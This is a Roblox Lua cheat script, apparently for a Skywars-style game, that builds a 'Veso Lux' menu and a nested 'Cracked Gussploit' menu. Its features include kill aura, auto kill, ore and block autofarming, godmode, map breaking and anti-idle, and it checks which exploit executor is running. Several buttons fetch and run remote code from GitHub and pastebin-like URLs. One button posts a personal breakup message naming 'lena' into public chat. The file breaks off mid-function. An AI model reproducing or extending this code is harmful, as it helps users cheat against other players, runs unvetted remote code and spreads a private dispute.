
for i,v in pairs(game.CoreGui:GetDescendants()) do
	if v.Name == "Veso Lux" then
		v:Destroy()
	end
end
for i,v in pairs(game.CoreGui:GetDescendants()) do
	if v.Name == "VesoLoader" then
		v:Destroy()
	end
end

local VesoLoader = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local ImageLabel = Instance.new("ImageLabel")
local Frame = Instance.new("Frame")

--Properties:

VesoLoader.Name = "VesoLoader"
VesoLoader.Parent = game.CoreGui
VesoLoader.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Main.Name = "Main"
Main.Parent = VesoLoader
Main.BackgroundColor3 = Color3.fromRGB(20, 17, 21)
Main.Position = UDim2.new(0.789023995, 0, 0.856858909, 0)
Main.Size = UDim2.new(0, 282, 0, 84)

UICorner.CornerRadius = UDim.new(0, 4)
UICorner.Parent = Main

TextLabel.Parent = Main
TextLabel.Active = true
TextLabel.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(40, 40, 40)
TextLabel.Position = UDim2.new(0.439716309, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 128, 0, 50)
TextLabel.Font = Enum.Font.FredokaOne
TextLabel.Text = "Veso Lux"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 27.000
TextLabel.TextWrapped = true

ImageLabel.Parent = Main
ImageLabel.Active = true
ImageLabel.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.Size = UDim2.new(0, 87, 0, 73)
ImageLabel.Image = "http://www.roblox.com/asset/?id=9455689518"

Frame.Parent = Main
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BorderColor3 = Color3.fromRGB(255, 255, 255)
Frame.Position = UDim2.new(0, 0, 0.952381015, 0)
Frame.Size = UDim2.new(0, 282, 0, 4)

wait(1.5)
Frame:TweenSize(UDim2.new(0, 0, 0, 4), "Out" , "Sine" , 10)
wait(9.7)
for i,v in pairs(game.CoreGui:GetDescendants()) do
	if v.Name == "VesoLoader" then
		v:Destroy()
	end
end




for i,v in pairs(game.CoreGui:GetDescendants()) do
	if v.Name == "Veso Lux" then
		v:Destroy()
	end
end

--Library
local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/GreenDeno/Venyx-UI-Library/main/source.lua"))()
local venyx = library.new("Veso Lux", 5013109572)



--Themes
local themes = {
	Background = Color3.fromRGB(24, 24, 24),
	Glow = Color3.fromRGB(0, 0, 0),
	Accent = Color3.fromRGB(10, 10, 10),
	LightContrast = Color3.fromRGB(20, 20, 20),
	DarkContrast = Color3.fromRGB(14, 14, 14),  
	TextColor = Color3.fromRGB(255, 255, 255)
}

--First Page
local page = venyx:addPage("Scripts")
local page2 = venyx:addPage("Player")
local page3 = venyx:addPage("Staff")
local theme = venyx:addPage("Theme")
local page4 = venyx:addPage("Credits")
local sektin = page3:addSection("Buttons")
local sektion = page2:addSection("Sliders")
local others = page2:addSection("Others")
local sektion2 = page2:addSection("Teleports & Stuff Things")
local section1 = page:addSection("Toggles")
local section2 = page:addSection("Buttons")
local section3 = page:addSection("Mine")
local section4 = page4:addSection("Credits")
local build = page3:addSection("Build")
local colors = theme:addSection("Colors")
local Sky = page3:addSection("Sky")


for theme, color in pairs(themes) do -- all in one theme changer, i know, im cool
	colors:addColorPicker(theme, color, function(color3)
		venyx:setTheme(theme, color3)
	end)
end

--SECTİON 1
section4:addButton("Hanki#9045", function()
	setclipboard("Hanki#9045")
end)
section4:addButton("Tameria#0001", function()
	setclipboard("Tameria#0001")
end)
section4:addButton("Egw#0001", function()
	setclipboard("Egw#0001")
end)
section4:addButton("ogxz'#4158", function()
	setclipboard("ogxz'#4158")
end)




--Collect Coins
_G.Coin = true
section1:addToggle("Collect Coins", nil, function(value)
	if value == true then
		_G.Coin = true
		while _G.Coin == true do
			wait()
			if game:GetService("Workspace").GameStorage.Coins:FindFirstChild("Coin") then
				for _,f in pairs(game:GetService("Workspace").GameStorage.Coins.Coin:GetDescendants()) do  
					firetouchinterest(game.Players.LocalPlayer.Character.Head, f.Parent, 0)  
					firetouchinterest(game.Players.LocalPlayer.Character.Head, f.Parent, 1)
				end
			end
		end
	end
	if value == false then
		_G.Coin = true
	end
end)

ct={}
te=table.insert

local Player       = game.Players.LocalPlayer
local Char         = Player.Character
local settings     = {repeatamount = 1} 
_G.Dist            = 0
_G.SphereActivated = false 
setsimulationradius(math.huge,math.huge)
Char.Humanoid:UnequipTools()

te(ct,game:GetService("RunService").Stepped:Connect(function()
	local Player = game.Players.LocalPlayer
	local Char = Player.Character
	pcall(function()
		for i,v in pairs(game.Players:GetPlayers()) do 
			if v ~= Player then 
				if v.Character.Humanoid.Health ~= 0 then 
					if (v.Character.HumanoidRootPart.Position - Char.HumanoidRootPart.Position).Magnitude <= _G.Dist then 
						for _,x in pairs(v.Character:GetChildren()) do 
							if x:IsA("Part") then 
								for i = 1,settings.repeatamount do 
									firetouchinterest(Char:FindFirstChildOfClass("Tool").Handle, x, 0)
									firetouchinterest(Char:FindFirstChildOfClass("Tool").Handle, x, 1)
								end
							end
						end
					end
				end
			end
		end
	end)
end))


--Kill Aura
section1:addToggle("Kill Aura", nil, function(value)
	local z = game.Players.LocalPlayer.Character.Humanoid
	if value == true then
		_G.SphereActivated = true 
		_G.Dist = _G.Dist + 77.5
		game.StarterGui:SetCore("SendNotification", {
			Title = "Aura Enabled"; 
			Text     = "Script Enabled"; 
			Duration = 0.5;
		}) 
	end

	if value == false then
		_G.SphereActivated = false 
		_G.Dist = _G.Dist - 77.5
		game.StarterGui:SetCore("SendNotification", {
			Title = "Aura Disabled"; 
			Text  = "Script Disabled"; 
			Duration = 0.5;
		}) 
		for i,f in next, game:GetService("Workspace"):GetChildren() do
			if f.Name == 'Bruhh' then 
				f:Destroy()
			end
		end
		for i,v in pairs(game:GetService("CoreGui").RobloxGui.Modules:GetDescendants()) do 
			if v.Name == 'Sphere' then
				v:Destroy()
			end
		end
	end
end)

--Anti Fall
section1:addToggle("Platform", nil, function(value)
	if value == true then
		local baseplate    = Instance.new("Part")
		baseplate.Parent   = workspace
		baseplate.Name = "AntiFallPart"
		baseplate.Transparency = 0.5
		baseplate.Size     = Vector3.new(1500,1,1500)
		baseplate.Anchored = true
		baseplate.Position = Workspace.Lobby["Middle Room"].Floor.Base.Union.Position + Vector3.new(0,-110,0)
		baseplate.Material = Enum.Material.SmoothPlastic
	end
	if value == false then
		game.Workspace["AntiFallPart"]:Destroy()
	end
end)


--İnfinite Jump
_G.infinjump = false
section1:addToggle("infJump", nil, function(value)
	if value == true then
		_G.infinjump = true
		local Player = game:GetService("Players").LocalPlayer
		local Mouse = Player:GetMouse()
		Mouse.KeyDown:connect(function(k)
			if _G.infinjump then
				if k:byte() == 32 then
					Humanoid = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
					Humanoid:ChangeState("Jumping")
					wait()
					Humanoid:ChangeState("Seated")
				end
			end

		end)
	end
	if value == false then
		if _G.infinjump == true then
			--        k = k:lower()
			_G.infinjump = false
		else

		end
	end
end)


--SECTİON 2
section3:addButton("Autofarm Ores", function()
	if game.Players.LocalPlayer.Backpack:FindFirstChild("Axe") then
		game.Players.LocalPlayer.Backpack:FindFirstChild("Axe").Parent =
			game.Players.LocalPlayer.Character
	end
	if game.Players.LocalPlayer.Character:FindFirstChild("Axe") then
		game.Players.LocalPlayer.Character:FindFirstChild("Axe"):Activate()
	end
	local cpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame

	local stuff = workspace:getDescendants()
	for i=1,#stuff do
		if stuff[i].Name == "Block" and stuff[i].Parent.Name == "Ores" then
			repeat
				wait()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = stuff[i].CFrame
				game.Players.LocalPlayer.Character.Axe.RemoteEvent:FireServer(stuff[i])
			until stuff[i].Name ~= "Block" or not game.Players.LocalPlayer.Character:findFirstChild("Axe")
		end
	end

	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = cpos
end)

section3:addButton("Autofarm Islands", function()
	if game.Players.LocalPlayer.Backpack:FindFirstChild("Axe") then
		game.Players.LocalPlayer.Backpack:FindFirstChild("Axe").Parent =
			game.Players.LocalPlayer.Character
	end
	if game.Players.LocalPlayer.Character:FindFirstChild("Axe") then
		game.Players.LocalPlayer.Character:FindFirstChild("Axe"):Activate()
	end
	local cpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame

	local stuff = workspace:getDescendants()
	for i=1,#stuff do
		if stuff[i].Name == "Block" and stuff[i].Parent.Name == "Map" then
			repeat
				wait()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = stuff[i].CFrame
				game.Players.LocalPlayer.Character.Axe.RemoteEvent:FireServer(stuff[i])
			until stuff[i].Name ~= "Ores" or not game.Players.LocalPlayer.Character:findFirstChild("Axe")
		end
	end

	if stuff[i].Name == "Block" and stuff[i].Parent.Name == "Ores" then
		repeat
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = stuff[i].CFrame
			game.Players.LocalPlayer.Character.Axe.RemoteEvent:FireServer(stuff[i])
		until stuff[i].Name ~= "Block" or not game.Players.LocalPlayer.Character:findFirstChild("Axe")
	end


	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = cpos
end)

section3:addButton("Autofarm Blocks", function()
	if game.Players.LocalPlayer.Backpack:FindFirstChild("Axe") then
		game.Players.LocalPlayer.Backpack:FindFirstChild("Axe").Parent =
			game.Players.LocalPlayer.Character
	end
	if game.Players.LocalPlayer.Character:FindFirstChild("Axe") then
		game.Players.LocalPlayer.Character:FindFirstChild("Axe"):Activate()
	end
	wait()
	local cpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame

	local stuff = workspace:getDescendants()
	for i=1,#stuff do
		if stuff[i].Name == "Block" and stuff[i].Parent.Name == "Blocks" then
			repeat
				wait()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = stuff[i].CFrame
				game.Players.LocalPlayer.Character.Axe.RemoteEvent:FireServer(stuff[i])
			until game.Players.LocalPlayer.Backpack.Block.Left.Value ~= 64 or not game.Players.LocalPlayer.Character:findFirstChild("Axe")
		end
	end

	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = cpos
end)

section3:addButton("Fast Autofarm", function()
	game.Players.LocalPlayer.Character.Humanoid:UnequipTools()
	if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Axe") then
		local Adrix = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		game.Players.LocalPlayer.Character.Humanoid:UnequipTools()
		game.Players.LocalPlayer.Backpack["Axe"].Parent = game:GetService("Players").LocalPlayer


		local BG = Instance.new('BodyGyro', game:GetService("Players").LocalPlayer.Character.Torso)
		local BV     = Instance.new('BodyVelocity', game:GetService("Players").LocalPlayer.Character.Torso)
		BG.P         = 9e4
		BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		BG.cframe    = game:GetService("Players").LocalPlayer.Character.Torso.CFrame
		BV.velocity  = Vector3.new(0, 0, 0)
		BV.maxForce  = Vector3.new(9e9, 9e9, 9e9)

		function onTouched(part)       
			local h = part
			if h.Name == "Block" and h.Parent.Name == "Ores" then
				game.Players.LocalPlayer["Axe"].RemoteEvent:FireServer(h)  
			end
		end

		function AdriIsABaby()
			Partz              = Instance.new("Part")
			Partz.Parent       = workspace
			Partz.Transparency = 1
			Partz.CanCollide   = false
			Partz.Massless     = true
			Partz.Position     = game.Players.LocalPlayer.Character.Head.Position
			Partz.Size         = Vector3.new(34,38,34)

			local bruh = Partz.Touched:connect(onTouched)
			wait()
			bruh:Disconnect()
			Partz:Destroy()
		end

		function ban()
			AdriIsABaby()
		end
		game:GetService('Players').LocalPlayer.Character.Humanoid.CameraOffset = Vector3.new(0,10,0)
		function Time()
			wait(0.0019)  
		end
		ct = {}
		for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
			if v:IsA("BasePart") then 
				table.insert(ct,game:GetService('RunService').Stepped:connect(function()
					v.CanCollide = false
				end))
			end
		end
		local plr = game.Players.LocalPlayer

		function ah()
			BG:Destroy()
			BV:Destroy()
			plr.Character.Humanoid.PlatformStand = false
			for i,v in pairs(ct) do v:Disconnect() end
		end

		for i,v in next,workspace:GetDescendants() do
			if v.Name == "Block" and v.Parent.Name == "Ores" then
				plr.Character.Humanoid.PlatformStand = true
				repeat
					Time()
					ban()
					plr.Character.HumanoidRootPart.CFrame = v.CFrame + Vector3.new(0,1,0)
				until v.Name ~= "Block" or not plr:FindFirstChild("Axe") 
				Time()
			end
		end


		plr:FindFirstChild("Axe").Parent = plr.Backpack
		game.StarterGui:SetCore("SendNotification", {
			Title    = "No blocks in game.."; 
			Text     = ""; 
			Duration = 3;
		})  
		ah()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Adrix
		game:GetService('Players').LocalPlayer.Character.Humanoid.CameraOffset = Vector3.new(0,0,0)
		plr:FindFirstChild("Axe").Parent = plr.Backpack
		---
	else
		game.StarterGui:SetCore("SendNotification", {
			Title    = "Ok.";
			Text     = "";
			Duration = 0.5;
		})
	end
end)

section3:addButton("Fast Autofarm Islands", function()
	game.Players.LocalPlayer.Character.Humanoid:UnequipTools()
	if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Axe") then
		local Adrix = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		game.Players.LocalPlayer.Character.Humanoid:UnequipTools()
		game.Players.LocalPlayer.Backpack["Axe"].Parent = game:GetService("Players").LocalPlayer


		local BG = Instance.new('BodyGyro', game:GetService("Players").LocalPlayer.Character.Torso)
		local BV     = Instance.new('BodyVelocity', game:GetService("Players").LocalPlayer.Character.Torso)
		BG.P         = 9e4
		BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		BG.cframe    = game:GetService("Players").LocalPlayer.Character.Torso.CFrame
		BV.velocity  = Vector3.new(0, 0, 0)
		BV.maxForce  = Vector3.new(9e9, 9e9, 9e9)

		function onTouched(part)       
			local h = part
			if h.Name == "Block" and h.Parent.Name == "Map" then
				game.Players.LocalPlayer["Axe"].RemoteEvent:FireServer(h)  
			end
		end

		function AdriIsABaby()
			Partz              = Instance.new("Part")
			Partz.Parent       = workspace
			Partz.Transparency = 1
			Partz.CanCollide   = false
			Partz.Massless     = true
			Partz.Position     = game.Players.LocalPlayer.Character.Head.Position
			Partz.Size         = Vector3.new(34,38,34)

			local bruh = Partz.Touched:connect(onTouched)
			wait()
			bruh:Disconnect()
			Partz:Destroy()
		end

		function ban()
			AdriIsABaby()
		end
		game:GetService('Players').LocalPlayer.Character.Humanoid.CameraOffset = Vector3.new(0,10,0)
		function Time()
			wait(0.0019)  
		end
		ct = {}
		for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
			if v:IsA("BasePart") then 
				table.insert(ct,game:GetService('RunService').Stepped:connect(function()
					v.CanCollide = false
				end))
			end
		end
		local plr = game.Players.LocalPlayer

		function ah()
			BG:Destroy()
			BV:Destroy()
			plr.Character.Humanoid.PlatformStand = false
			for i,v in pairs(ct) do v:Disconnect() end
		end

		for i,v in next,workspace:GetDescendants() do
			if v.Name == "Block" and v.Parent.Name == "Map" then
				plr.Character.Humanoid.PlatformStand = true
				repeat
					Time()
					ban()
					plr.Character.HumanoidRootPart.CFrame = v.CFrame + Vector3.new(0,1,0)
				until v.Name ~= "Block" or not plr:FindFirstChild("Axe") 
				Time()
			end
		end


		plr:FindFirstChild("Axe").Parent = plr.Backpack
		game.StarterGui:SetCore("SendNotification", {
			Title    = "No blocks in game.."; 
			Text     = ""; 
			Duration = 3;
		})  
		ah()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Adrix
		game:GetService('Players').LocalPlayer.Character.Humanoid.CameraOffset = Vector3.new(0,0,0)
		plr:FindFirstChild("Axe").Parent = plr.Backpack
		---
	else
		game.StarterGui:SetCore("SendNotification", {
			Title    = "Ok.";
			Text     = "";
			Duration = 0.5;
		})
	end
end)

sektin:addButton("Auto Kill", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/EmeraldHearts/xd/main/autokill", true))()
end)

--Fe Shield
section2:addButton("Fe Shield (Need Shield!)", function()
	local Why      = game:GetService("Players").LocalPlayer
	local Char     = Why.Character
	local backpack = Why.Backpack

	Char.Humanoid:UnequipTools()
	wait()
	for i,v in next, backpack:GetDescendants() do
		if v:IsA("Tool") and v.Name =="Shield" then
			v.GripPos         = Vector3.new(0,10000,0)
			v.Handle.Massless = true
			v.Parent          = Char
			v:Activate()
			v.ShieldPotion:Destroy()
			v:Destroy()
		end
	end


end)


--Fix İnf Shield
section2:addButton("Fix Fe Shield", function()
	
end)

section2:addButton("Cracked Gussploit", function()

	local function getexploit()
		local exploit =
			(syn and not is_sirhurt_closure and not pebc_execute and "Synapse") or (secure_load and "Sentinel") or
			(is_sirhurt_closure and "Sirhurt") or
			(pebc_execute and "ProtoSmasher") or
			(KRNL_LOADED and "Krnl") or
			(WrapGlobal and "WeAreDevs") or
			(isvm and "Proxo") or
			(shadow_env and "Shadow") or
			(jit and "EasyExploits") or
			(getscriptenvs and "Calamari") or
			(unit and not syn and "Unit") or
			(OXYGEN_LOADED and "Oxygen U") or
			(IsElectron and "Electron") or
			("Unsupported")

		return exploit
	end


	local Library = loadstring(game:HttpGet("https://pastebinp.com/raw/KGP4LVmz"))()
	local Forums = Library.new("GusSploit v3.5 | SKYWARS/TEST | " .. getexploit())

	local vu = game:GetService("VirtualUser")
	game:GetService("Players").LocalPlayer.Idled:connect(
	function()
		vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
		wait(1)
		vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
	end
	)
	-- tab setup
	local preview = Forums:NewSection("Info")
	local nop = Forums:NewSection("OP Stuff")
	local nok = Forums:NewSection("Block/Pickaxe")
	local nop2 = Forums:NewSection("Regular Stuff")
	local nop3 = Forums:NewSection("Armor")
	local yes = Forums:NewSection("Position")
	local yesnt = Forums:NewSection("Player")
	local nyes = Forums:NewSection("Teleports")


	preview:NewButton("Name: " .. game.Players.LocalPlayer.Name)
	preview:NewButton("DisplayName: " .. game.Players.LocalPlayer.DisplayName)
	preview:NewButton("UserID: " .. game.Players.LocalPlayer.UserId)
	preview:NewButton("PlaceID: " .. game.PlaceId)
	preview:NewButton("JobID (server id): " .. game.JobId)
	preview:NewButton("Account Age: " .. game.Players.LocalPlayer.AccountAge)

	preview:NewButton("Executor: " .. getexploit())
	local pos
	local roundedpos
	local cframe
	local roundedcframe

	local posbtn =
		yes:NewButton(
			"Character Pos: ",
			function()
			end
		)

	local cfbtn =
		yes:NewButton(
			"Character CFrame: ",
			function()
			end
		)

	-- buttons n stuff





	nok:NewButton(
		"Barrier",
		function()
			function onTouched(part)       
				local h = part
				if h.Name == "Block" then
					game:GetService("Players").LocalPlayer.Backpack.Block.RemoteEvent:FireServer(h,Enum.NormalId.Top)
				end
			end
			Partz              = Instance.new("Part")
			Partz.Parent       = workspace
			Partz.Transparency = 1
			Partz.CanCollide   = false
			Partz.Massless     = true
			Partz.Position     = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,51,0)
			Partz.Size         = Vector3.new(40,40,40)
			Partz.CFrame       = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector*3.5

			local light         = Instance.new("SelectionBox")
			light.Adornee       = Partz
			light.LineThickness = 0.05
			light.Color3        = Color3.fromRGB(17, 17, 257)
			light.Parent        = Partz
			light.Name          = "SelectBox"



			local bruh = Partz.Touched:connect(onTouched)
			wait()
			bruh:Disconnect()
			Partz:Destroy()
		end
	)



	nop:NewButton(
		"AntiRoundKill",
		function()


			for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
				if v:IsA("BoolValue") then
					v:Destroy()
				end
			end

			if game:GetService("Workspace").Terrain:FindFirstChild("Seat")==nil then
				ct    = {}
				game.StarterGui:SetCore("SendNotification", {Title = "Enabled"; Text = ""; Duration = 3;})    
				sound = Instance.new("Seat", game:GetService("Workspace").Terrain)
				table.insert(ct,game:GetService("RunService").Stepped:Connect(function()
					if game:GetService("Workspace").timer.Value < 1 or game:GetService("Workspace").plrsLeft.Value < 2 then
						game.StarterGui:SetCore("SendNotification", {
							Title    = "round finished"; 
							Text     = ""; 
							Duration = 3;
						})         
						for i,v in pairs(ct) do v:Disconnect() end
						sound:Destroy()
						wait(2.3)
						game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-8, 268, 6)
						for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
							if v:IsA("Tool") then
								v.Parent = game.Players.LocalPlayer.Character
							end
						end
					end
				end))
			else
				game.StarterGui:SetCore("SendNotification", {Title = "Really Executed"; Text = ""; Duration = 3;})
				game:GetService("Players").LocalPlayer.PlayerGui.Extra.Local:Destroy()
				game:GetService("Players").LocalPlayer.PlayerGui.Extra.Local:Destroy()    
			end
		end

	)

	nok:NewButton(
		"MineAura",
		function()

			_G.NoBugs = true
			if _G.NoBugs == true then
				function onTouched(part)       
					local h = part
					if h.Name == "Block" then
						game:GetService("Players").LocalPlayer.Backpack.Axe.RemoteEvent:FireServer(h)  
					end
				end
				Partz              = Instance.new("Part")
				Partz.Parent       = workspace
				Partz.Transparency = 1
				Partz.CanCollide   = false
				Partz.Massless     = true
				Partz.Position     = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,9,0)
				Partz.Size         = Vector3.new(15,20,15)

				local light         = Instance.new("SelectionBox")
				light.Adornee       = Partz
				light.LineThickness = 0.05
				light.Color3        = Color3.fromRGB(0, 255, 0)
				light.Parent        = Partz
				light.Name          = "SelectBox"

				local bruh = Partz.Touched:connect(onTouched)

				wait()
				bruh:Disconnect()
				Partz:Destroy()
			end
		end
	)







	nok:NewButton(
		"GlitchBlocks",
		function()
			local Why = game:GetService("Players").LocalPlayer
			local Char = Why.Character
			local backpack = Why.Backpack

			backpack.Block.Parent =  Why.Character
			Char.Block.Left:Destroy()
			Char.Block.Parent = Why.Backpack
		end
	)

	nok:NewButton(
		"FakeBlock",
		function()
			local Players       = game:GetService("Players")
			local localPlayer   = Players.LocalPlayer
			local backpack      = localPlayer:WaitForChild("Backpack")
			local tool          = Instance.new("Tool")
			tool.RequiresHandle = false
			tool.CanBeDropped   = true
			tool.Parent         = backpack
			tool.Name           = "FakeBlock"
			tool.Equipped:Connect(function(mouse)
				mouse.Button1Down:Connect(function()
					if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Block") then
						if mouse.Target and mouse.Target.Parent then
							game:GetService("Players").LocalPlayer.Backpack.Block.RemoteEvent:FireServer(mouse.Target,Enum.NormalId.Right)
							game:GetService("Players").LocalPlayer.Backpack.Block.RemoteEvent:FireServer(mouse.Target,Enum.NormalId.Left)
							game:GetService("Players").LocalPlayer.Backpack.Block.RemoteEvent:FireServer(mouse.Target,Enum.NormalId.Back)
							game:GetService("Players").LocalPlayer.Backpack.Block.RemoteEvent:FireServer(mouse.Target,Enum.NormalId.Front)
						end
					end
				end)
			end)
		end
	)

	nok:NewButton(
		"FakePickaxe",
		function()
			local Players       = game:GetService("Players")
			local localPlayer   = Players.LocalPlayer
			local backpack      = localPlayer:WaitForChild("Backpack")
			local tool          = Instance.new("Tool")
			tool.RequiresHandle = false
			tool.CanBeDropped   = true
			tool.Parent         = backpack
			tool.Name           = "FakeAxe"
			tool.Equipped:Connect(function(mouse)
				mouse.Button1Down:Connect(function()
					if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Block") then
						if mouse.Target and mouse.Target.Parent then
							local Adrix = {
								[1] = mouse.Target
							}

							game:GetService("Players").LocalPlayer.Backpack.Axe.RemoteEvent:FireServer(unpack(Adrix))  
						end
					end
				end)
			end)
		end
	)


	--nop:NewButton(
	--    "RoundNoKill",
	--    function()
	--        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
	--			if v:IsA("BoolValue") then
	--				v:Destroy()
	--			end
	--		end   
	--    end
	--)

	nop3:NewButton(
		"Full Mega Set",
		function()
			local priorpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
			wait(0.01)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
				CFrame.new(-11.0000038, 264, 61, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			wait(0.5)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
				CFrame.new(12, 263.5, 61, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			wait(0.5)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = priorpos
		end
	)


	nop2:NewButton(
		"Autofarm",
		function()
			local cpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame

			local stuff = workspace:getDescendants()
			for i=1,#stuff do
				if stuff[i].Name == "Block" and stuff[i].Parent.Name == "Ores" then
					repeat
						wait()
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = stuff[i].CFrame
						game.Players.LocalPlayer.Character.Axe.RemoteEvent:FireServer(stuff[i])
					until stuff[i].Name ~= "Block" or not game.Players.LocalPlayer.Character:findFirstChild("Axe")
				end
			end

			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = cpos
		end
	)

	nop2:NewButton(
		"Break Map",
		function()
			local cpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame

			local stuff = workspace:getDescendants()
			for i=1,#stuff do
				if stuff[i].Name == "Block" and stuff[i].Parent.Name == "Map" then
					repeat
						wait()
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = stuff[i].CFrame
						game.Players.LocalPlayer.Character.Axe.RemoteEvent:FireServer(stuff[i])
					until stuff[i].Name ~= "Block" or not game.Players.LocalPlayer.Character:findFirstChild("Axe")
				end
			end

			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = cpos
			wait (0.1)
			local cpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame

			local stuff = workspace:getDescendants()
			for i=1,#stuff do
				if stuff[i].Name == "Block" and stuff[i].Parent.Name == "Ores" then
					repeat
						wait()
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = stuff[i].CFrame
						game.Players.LocalPlayer.Character.Axe.RemoteEvent:FireServer(stuff[i])
					until stuff[i].Name ~= "Block" or not game.Players.LocalPlayer.Character:findFirstChild("Axe")
				end
			end

			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = cpos
		end
	)


	nop2:NewButton(
		"Sword Mesh",
		function()
			local playerName = game.Players.LocalPlayer.Name
			game.Workspace:FindFirstChild(playerName).Sword.Handle.Mesh:Destroy()
		end
	)

	nop:NewButton(
		"Shield Godmode",
		function()
			local playerName = game.Players.LocalPlayer.Name

			game.Players.LocalPlayer.Character:FindFirstChild("Shield"):Activate()
			wait (1)
			game.Workspace:FindFirstChild(playerName).Shield.ShieldPotion:Destroy()
		end
	)


	nop:NewButton(
		"Hat Spin (FE)",
		function()
			loadstring(game:HttpGet(("https://pastebinp.com/raw/fR9GvggH"),true))()
		end
	)

	nop:NewButton(
		"AntiHB",
		function()
			if game.Players.LocalPlayer.Character ~= nil then
				local char = game.Players.LocalPlayer.Character
				char.Parent = nil
				char.HumanoidRootPart:Destroy()
				char.Parent = workspace
			end
		end
	)


	nop2:NewButton(
		"Darklingz Breakup",
		function()
			local args = {
				[1] = "the amount of pain i went through this year is insane, enough to drive u to do stuff u NEVER wouldve done in the first place",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = " I had to hold in all of it too, as if its all ok. ",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = "Im sick of it and im not gonna let it happen again, u wanna add drac for fame, go do it. ",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = " But u cant control me and i can add any girl i want from my school. ",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = " i literally left so U can be happy, so u can find someone who can MAKE u happy.",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = "but all u see is the bad stuff, its ALWAYS the bad stuff",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = "u literally threatened me, hurt me, got me SAD, made me do stuff without my #######",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = "and made me do things i didnt want to do, u got mad at me for being controlling but UR controlling me saying i cant add any girls or anyone,",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = "but now im done with that and im done with u, i cannot ever forgive u for any of those things so im out for good, goodbye lena im gonna be moving on",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

